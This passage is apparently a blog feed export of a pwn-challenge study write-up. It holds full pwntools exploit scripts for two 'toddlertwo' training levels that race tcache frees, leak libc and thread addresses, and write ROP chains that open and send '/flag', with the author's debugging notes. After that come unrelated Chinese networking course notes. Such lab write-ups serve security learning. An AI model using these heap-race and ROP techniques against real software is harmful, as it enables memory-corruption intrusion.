class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> output == packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;OUTPUT: &#x27;</span> + output + <span class="hljs-string">b&#x27; PACKED: &#x27;</span>, packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#malloc the controlled chunk</span><br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>.encode())<br>    idx += <span class="hljs-number">1</span><br>    <br><span class="hljs-comment">#support 8 bytes read</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_read</span>(<span class="hljs-params">r1, r2, addr, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x4040</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        r1.sendline(<span class="hljs-string">b&#x27;printf 10&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        controlled_allocation(r1, r2, addr)<br>        r1.sendline(<span class="hljs-string">f&#x27;printf <span class="hljs-subst">&#123;idx-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>.encode())<br>    r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>    output = r1.clean()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;MESSAGE IS: &#x27;</span>, output)<br>    pwn.context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>    <span class="hljs-keyword">return</span> output<br>    <br><span class="hljs-comment">#support digital write</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_write</span>(<span class="hljs-params">r1, r2, addr, value, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+message_offset+<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(value[<span class="hljs-number">0</span>]) == <span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;SCANF(bytes): &#x27;</span>, value[<span class="hljs-number">0</span>])<br>            r1.sendline(<span class="hljs-string">b&#x27;scanf 10 &#x27;</span> + value[<span class="hljs-number">0</span>])<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(value[<span class="hljs-number">0</span>]) == <span class="hljs-built_in">int</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;SCANF(int): &#x27;</span>, value[<span class="hljs-number">0</span>])<br>            r1.sendline(<span class="hljs-string">b&#x27;scanf 10 &#x27;</span> + value[<span class="hljs-number">0</span>].to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>))<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-comment">#end of `if unalign:`</span><br>    controlled_allocation(r1, r2, addr)<br>    r1.sendline(<span class="hljs-string">b&#x27;scanf %d &#x27;</span>%(idx-<span class="hljs-number">1</span>) + pwn.flat(value))<br><br><span class="hljs-keyword">try</span>:<br>    p.kill(),r1.close(),r2.close()<br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-keyword">pass</span><br>pwn.context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>pwn.context.binary = <span class="hljs-string">&#x27;./toddlertwo_level2.0.elf64&#x27;</span><br>p=pwn.process(<span class="hljs-string">&quot;./toddlertwo_level7.0.elf64&quot;</span>)<br>p.clean()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">print</span>(f.read())<br>r1 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r2 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br><br>message_offset = <span class="hljs-number">0x4040</span><br>perthread_leak = leak_perthread_addr(r1,r2);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: PERTHREAD: &quot;</span>, <span class="hljs-built_in">hex</span>(perthread_leak))<br>main_arena_ptr_address = perthread_leak - <span class="hljs-number">0x8d0</span> + <span class="hljs-number">0x890</span><br>time.sleep(<span class="hljs-number">0.2</span>)<br>main_arena_addr = pwn.u64(arbitrary_read(r1, r2, main_arena_ptr_address)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MAIN ARENA ADDR: &quot;</span>, <span class="hljs-built_in">hex</span>(main_arena_addr))<br>libc_base = main_arena_addr - <span class="hljs-number">0x1bdba0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;LIBC BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br>stored_rip_addr = main_arena_addr - <span class="hljs-number">0x1c1d78</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;STORED RIP ADDR: &#x27;</span>, <span class="hljs-built_in">hex</span>(stored_rip_addr))<br><span class="hljs-comment">#stored_rip = pwn.u64(arbitrary_read(r1, r2, stored_rip_addr, True)[:-1].ljust(8, b&#x27;\0&#x27;))</span><br><span class="hljs-comment">#print(&#x27;STORED RIP: &#x27;, stored_rip)</span><br>binary_base = <span class="hljs-number">0</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f: <br>    binary_base = <span class="hljs-built_in">int</span>(f.read(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;BINARY BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(binary_base))<br><br><span class="hljs-comment">#ROLLING!!!!!!!!!!!!!!!!!!!</span><br>libc = p.libc<br>libc.address = libc_base<br>rop = pwn.ROP(libc, badchars=<span class="hljs-string">b&quot;\x09\x0a\x0b\x0c\x0d\x0e\x20&quot;</span>)<br>rop.call(<span class="hljs-string">&quot;close&quot;</span>, [<span class="hljs-number">3</span>]) <span class="hljs-comment"># used for correctly execute sendfile.</span><br>rop.call(<span class="hljs-string">&quot;read&quot;</span>, [<span class="hljs-number">0</span>, libc.bss(<span class="hljs-number">0x123</span>), <span class="hljs-number">42</span>])<br>rop.call(<span class="hljs-string">&quot;open&quot;</span>, [libc.bss(<span class="hljs-number">0x123</span>), <span class="hljs-number">0</span>])<br>rop.call(<span class="hljs-string">&quot;sendfile&quot;</span>, [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1024</span>])<br>rop.call(<span class="hljs-string">&quot;exit&quot;</span>, [<span class="hljs-number">42</span>])<br><br>arbitrary_write(r1, r2, stored_rip_addr, [rop.chain()], <span class="hljs-literal">True</span>)<br>r1.sendline(<span class="hljs-string">&quot;quit&quot;</span>)<br>p.send(<span class="hljs-string">&quot;/flag\0&quot;</span>)<br><span class="hljs-built_in">print</span>( <span class="hljs-string">&quot;LEAKED:&quot;</span>, p.readall())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;EXITED: &quot;</span>, p.poll())<br></code></pre></div></td></tr></table></figure><h4 id="level8-6"><a href="#level8-6" class="headerlink" title="level8"></a>level8</h4><p>emmmm, i can’t figure out the difference.</p><p>ohhhh, it use the pthread_exit(), not the normal return, so the rop attack to the return address is no longer viable.</p><p>i may alter another thread’s return address, such as thread 3 scanf return. It just lies on the top of the challenge’s stack frame, so it is at the constant offset from somewhere in high address space.</p><blockquote><p>address of the return address pointer of thread 3 scanf is stored at where at a constant offset from store_rip_address with <del>-0x801000</del> bytes distance.</p><img src="../../image/pwn-modules/image-20220625102559622.png" alt="image-20220625102559622" style="zoom:80%;" /></blockquote><p>okay, the fscanf doesn’t have <code>push rbp</code> this procedure, so calc the distance between fscanf and stored_rip_address by <code>rbp+8</code> is purely inaccurate. the actual address of its return address should be checked by gdb into stack:</p><img src="../../image/pwn-modules/image-20220625153005802.png" alt="image-20220625153005802" style="zoom:80%;" /><p><del>the pwntools is going crazy</del>, i’m gonna crazy.</p><ol><li>the read syscall with first arg being 0 won’t simply work as i thouhgt. there is something strange when communicateing with main thread’s stdin/stdout – could child thread be influenced by it?</li><li>or try to calc the address of tcp channel fd(in TLS addressing by fs register)?</li></ol><blockquote><blockquote><p>the <code>mov rax, fs:0x28</code> means referencing the value stored in fsbase+0x28 then copy it to rax. there is no <strong>shifting</strong>. </p></blockquote><p>the second method looks more feasible. here it is(calc from libc_base):</p><img src="../../image/pwn-modules/image-20220625205927958.png" alt="image-20220625205927958" style="zoom:80%;" /><p>okay, it’s stream pointer, i go wrong again.</p><p><del>when i follow the pace of fscanf, i found that it finally use fd=6 to read data in.</del></p></blockquote><p>Fine, I am now absolutely grasping the principle. the <strong>first problem</strong> above is just a misunderstanding of all the file descriptor and file stream and threads. </p><ul><li>in this program, main thread use <code>accept()</code> to receive a socket connect and return a <code>fd</code>. then <code>run_thread()</code> use <code>fdopen()</code> to turn fd into a <em>FILE* stream</em>, and write this FILE pointer into thread local storage(that is fs-based addressing).</li><li>the FILE stream and file descriptor are interchangeable, first is a high level interface, the second is a low level interface. child threads use <code>fscanf</code> and <code>fprintf</code> to read from or write to the stream(that is fds), that means the whole program’s stdin, stdout, and stderr is still viable in chile thread. so <code>read(0, libc.bss(), 0x400)</code> is correct.</li><li>one more thing needed to notice is that before thread 3 returns from fscanf, somewhere on the stack will be overwritten with what bytes I send into. so I additionally calc the right gadget of <code>pop rdi</code> so that the ropchain works.</li></ul><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">import</span> os<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_perthread_addr</span>(<span class="hljs-params">r1,r2</span>):</span><br>    <span class="hljs-keyword">if</span> os.fork()==<span class="hljs-number">0</span>:<br>        r1.sendline(<span class="hljs-string">b&quot;malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>        exit()<br>    r2.sendline(<span class="hljs-string">b&quot;printf 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>    os.wait()<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    output = r2.clean()<br>    r1.clean()<br>    leak = <span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> output.split() <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\x7f&#x27;</span> <span class="hljs-keyword">in</span> a)[<span class="hljs-number">8</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)<br>    <span class="hljs-comment">#pwn.gdb.attach(p, &#x27;init-pwndbg\n&#x27;)</span><br>    <span class="hljs-comment">#input(&#x27;press enter to continue&#x27;)</span><br>    r1.sendline(<span class="hljs-string">b&#x27;malloc 0&#x27;</span>)<br>    <span class="hljs-keyword">return</span> pwn.u64(leak)<br><br>perthread_leak = <span class="hljs-number">0</span>   <br>idx = <span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">controlled_allocation</span>(<span class="hljs-params">r1, r2, addr</span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">global</span> perthread_leak<br>    chunk_0_addr = perthread_leak + <span class="hljs-number">0x650</span><br>        <br>    packed = pwn.p64( (chunk_0_addr&gt;&gt;<span class="hljs-number">12</span>)^addr )<br>    r1.clean(),r2.clean()<br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">f&#x27;free <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment">#after pass scanf check -&gt; free it -&gt; then overwrite tcache next pointer</span><br>        <span class="hljs-keyword">if</span> os.fork() == <span class="hljs-number">0</span>:<br>            r1.sendline(<span class="hljs-string">f&#x27;free 0&#x27;</span>.encode())<br>            os.kill(os.getpid(), <span class="hljs-number">9</span>)<br>            <br>        r2.send((<span class="hljs-string">b&#x27;scanf 0 &#x27;</span> + packed + <span class="hljs-string">b&#x27;\n&#x27;</span>)*<span class="hljs-number">2000</span>)<br>        os.wait()<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 0 printf 0&#x27;</span>)<br>        output = <span class="hljs-string">b&#x27;&#x27;</span><br>        r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>        output = r1.recvline()[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> output == packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;OUTPUT: &#x27;</span> + output + <span class="hljs-string">b&#x27; PACKED: &#x27;</span>, packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#malloc the controlled chunk</span><br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>.encode())<br>    idx += <span class="hljs-number">1</span><br>    <br><span class="hljs-comment">#support 8 bytes read</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_read</span>(<span class="hljs-params">r1, r2, addr, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x4040</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        r1.sendline(<span class="hljs-string">b&#x27;printf 10&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        controlled_allocation(r1, r2, addr)<br>        r1.sendline(<span class="hljs-string">f&#x27;printf <span class="hljs-subst">&#123;idx-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>.encode())<br>    r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>    output = r1.clean()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;MESSAGE IS: &#x27;</span>, output)<br>    pwn.context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>    <span class="hljs-keyword">return</span> output<br>    <br><span class="hljs-comment">#support digital write</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_write</span>(<span class="hljs-params">r1, r2, addr, value, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x4040</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(value[<span class="hljs-number">0</span>]) == <span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;SCANF(bytes): &#x27;</span>, value[<span class="hljs-number">0</span>])<br>            r1.sendline(<span class="hljs-string">b&#x27;scanf 10 &#x27;</span> + value[<span class="hljs-number">0</span>])<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;PROCESS POLL: &#x27;</span>, p.poll())<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;SCANF(int): &#x27;</span>, value[<span class="hljs-number">0</span>])<br>            r1.sendline(<span class="hljs-string">b&#x27;scanf 10 &#x27;</span> + value[<span class="hljs-number">0</span>].to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>))<br>        <span class="hljs-keyword">return</span><br>    controlled_allocation(r1, r2, addr)<br>    r1.sendline(<span class="hljs-string">b&#x27;scanf %d &#x27;</span>%(idx-<span class="hljs-number">1</span>) + pwn.flat(value))<br><br><span class="hljs-keyword">try</span>:<br>    p.kill(),r1.close(),r2.close()<br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-keyword">pass</span><br>pwn.context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>pwn.context.binary = <span class="hljs-string">&#x27;./toddlertwo_level2.0.elf64&#x27;</span><br>p=pwn.process(<span class="hljs-string">&quot;./toddlertwo_level8.0.elf64&quot;</span>)<br>p.clean()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">print</span>(f.read())<br>r1 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r2 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br><br>perthread_leak = leak_perthread_addr(r1,r2);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: PERTHREAD: &quot;</span>, <span class="hljs-built_in">hex</span>(perthread_leak))<br>main_arena_ptr_address = perthread_leak - <span class="hljs-number">0x8d0</span> + <span class="hljs-number">0x890</span><br>time.sleep(<span class="hljs-number">0.2</span>)<br>main_arena_addr = pwn.u64(arbitrary_read(r1, r2, main_arena_ptr_address)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MAIN ARENA ADDR: &quot;</span>, <span class="hljs-built_in">hex</span>(main_arena_addr))<br>libc_base = main_arena_addr - <span class="hljs-number">0x1bdba0</span><br><span class="hljs-keyword">if</span> libc_base &gt;  <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;LIBC BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br>    stored_rip_addr = main_arena_addr - <span class="hljs-number">0x1c1d78</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;STORED RIP ADDR: &#x27;</span>, <span class="hljs-built_in">hex</span>(stored_rip_addr))<br>    <span class="hljs-comment">#stored_rip = pwn.u64(arbitrary_read(r1, r2, stored_rip_addr, True)[:-1].ljust(8, b&#x27;\0&#x27;))</span><br>    <span class="hljs-comment">#print(&#x27;STORED RIP: &#x27;, stored_rip)</span><br>    binary_base = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f: <br>        binary_base = <span class="hljs-built_in">int</span>(f.read(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;BINARY BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(binary_base))<br><br>    libc = p.libc<br>    libc.address = libc_base<br>    rop = pwn.ROP(libc, badchars=<span class="hljs-string">b&quot;\x09\x0a\x0b\x0c\x0d\x20&quot;</span>)<br>    rop.call(<span class="hljs-string">&quot;close&quot;</span>, [<span class="hljs-number">3</span>]) <span class="hljs-comment"># used for correctly execute sendfile.</span><br>    rop.call(<span class="hljs-string">&quot;read&quot;</span>, [<span class="hljs-number">0</span>, libc.bss(<span class="hljs-number">0x123</span>), <span class="hljs-number">42</span>])<br>    rop.call(<span class="hljs-string">&quot;open&quot;</span>, [libc.bss(<span class="hljs-number">0x123</span>), <span class="hljs-number">0</span>])<br>    rop.call(<span class="hljs-string">&quot;sendfile&quot;</span>, [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1024</span>])<br>    rop.call(<span class="hljs-string">&quot;exit&quot;</span>, [<span class="hljs-number">42</span>])<br><br>    thread3_scanf_return_saveaddress = stored_rip_addr - <span class="hljs-number">0x801460</span><br>    <span class="hljs-comment">#pwn.gdb.attach(p, &#x27;init-pwndbg\nb __isoc99_fscanf\nc\nsp\nthr 3\n&#x27;)</span><br>    <span class="hljs-comment">#input(&quot;press enter to continue&quot;)</span><br>    arbitrary_write(r1, r2, thread3_scanf_return_saveaddress , [rop.chain()], <span class="hljs-literal">True</span>)<br>    <span class="hljs-comment">#pwn.gdb.attach(p, &#x27;init-pwndbg\nb *__isoc99_fscanf+176\nc\nsp\nthr 3\n&#x27;)</span><br>    <span class="hljs-comment">#input(&#x27;press enter to continue&#x27;)</span><br>    r2.sendline(pwn.p64(libc_base+<span class="hljs-number">0x27C2D</span>))<br>    p.send(<span class="hljs-string">b&quot;/flag\0&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED:&quot;</span>, p.clean())<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;FAILED!!!!!&quot;</span>)<br></code></pre></div></td></tr></table></figure><h4 id="level9-6"><a href="#level9-6" class="headerlink" title="level9"></a>level9</h4><img src="../../image/pwn-modules/13160I313S.jpg" alt="23333" style="zoom:50%;" /><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>这里要指向2处的地址, 也就是bss+0x10<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>这里开始就是从改变后的rsp弹出返回地址. 开始准备通过puts来leak处libc地址.<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span>这之后要接收puts的地址.<a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Computer Networking</title>
    <link href="/2022-01/Learning-Computer-Networking/"/>
    <url>/2022-01/Learning-Computer-Networking/</url>
    
    <content type="html"><![CDATA[<p>这里是在寒假期间开始的计网课本笔记, 为了下学期等到老师讲故事的时候能自然的听下去……</p><h2 id="第一章-概论"><a href="#第一章-概论" class="headerlink" title="第一章: 概论"></a>第一章: 概论</h2><blockquote><p>直接复制(来自<a href="https://blog.csdn.net/wwj17647590781/article/details/116896442">这里</a>), 省时间看第八版, 有新的继续补充, 简单的概念罗列不想花时间了, </p></blockquote><h3 id="什么是因特网-两个角度"><a href="#什么是因特网-两个角度" class="headerlink" title="什么是因特网(两个角度)?"></a>什么是因特网(两个角度)?</h3><ul><li><p><strong>（组成角度）</strong> 一种是描述组成它的<strong>软硬件</strong>；</p><ul><li><p><strong>主机/终端：</strong> 所有连入因特网的设备都是主机/终端.</p><ul><li><strong>如何连接？</strong>：端系统通过通信链路和分组交换机连接到一起</li><li><strong>如何接入因特网？:</strong> 端系统通过因特网服务提供商（Internet Service Providers (ISPs)）接入因特网。</li></ul></li><li><p><strong>分组交换机：</strong></p><ul><li><p>最有的分组交换机：<strong>路由器</strong> 、链路交换机 </p></li><li><p>作用：从它的一条入链路接收分组，然后从它的一条出链路转发分组。</p><p>一个分组所经历的一系列通信链路和分组交换机称为通过该网络的<strong>路径route/path</strong>。</p></li><li><p>区别：路由器主要用在<strong>网络核心</strong>，链路层交换机主要用在<strong>接入网</strong>中</p></li></ul></li><li><p><strong>分组：</strong></p><ul><li><strong>组成：</strong> <strong>分组=用户数据段+相应的必要信息</strong>。</li><li><strong>作用：</strong> 端系统之间发送数据时，我们把数据分成一段一段，然后加上必要的信息形成一个一个数据包，这个数据包用术语说叫做分组）（相应的接收端会根据这一个一个数据包，也就是这一个一个分组中的必要信息来获得用户数据段）。</li></ul></li></ul></li><li><p><strong>（功能角度）</strong> 另一种是将其视为为an infrastructure for providing services to distributed applications.</p><ul><li>End systems attached to the Internet provide a <strong>socket interface套接字接口</strong> that specifies how a program running on one end system asks the Internet infrastructure to deliver data to a specific destination program running on another end system.</li><li>就是一堆rules</li></ul></li><li><p><strong>协议：</strong></p><ul><li><strong>定义：</strong> 两个或多个通信实体（不一定是端系统，还有可能是分组交换机等）之间交换信息的格式和次序以及对该信息所采取的动作（通俗来说：描述通信双方交互信息的方式，控制报文发送接受，相当于<strong>合同的约束</strong>）。</li><li><strong>例子：</strong><ul><li>硬件实现的控制协议控制了两块网卡之间的比特流；</li><li>在端系统中，拥塞控制协议控制了发送方和接收方之间传输数据的速率等</li></ul></li></ul></li></ul><h3 id="网络的边缘"><a href="#网络的边缘" class="headerlink" title="网络的边缘"></a>网络的边缘</h3><ul><li><p><strong>端系统：</strong> 与因特网相连的计算机和其它设备，往往处于网络的边缘</p></li><li><p>端系统分类：<strong>客户、服务器</strong> </p><ul><li>客户：通常就是台式电脑，笔记本电脑，手机等</li><li>服务器：一般是用于存储和发布Web页面、中继电子邮件等，属于<strong>大型数据中心</strong>。</li></ul></li><li><p><strong>接入网</strong>：access networks</p><ul><li><p><strong>概念：</strong> 是指将端系统连入到<strong>边缘路由器</strong>的<strong>物理链路</strong> </p></li><li><p><strong>边缘路由器：</strong> 是指端系统到任何其他远程端系统路径上的<strong>第一台路由器.</strong> </p></li><li><p><strong>本地中心局</strong> local central office (CO).</p></li><li><p>家庭接入：<strong>DSL、电缆</strong>、FTTH、==5G Fixed Wireless== </p></li><li><p><strong>digital subscriber line – DSL(数字用户线):</strong> 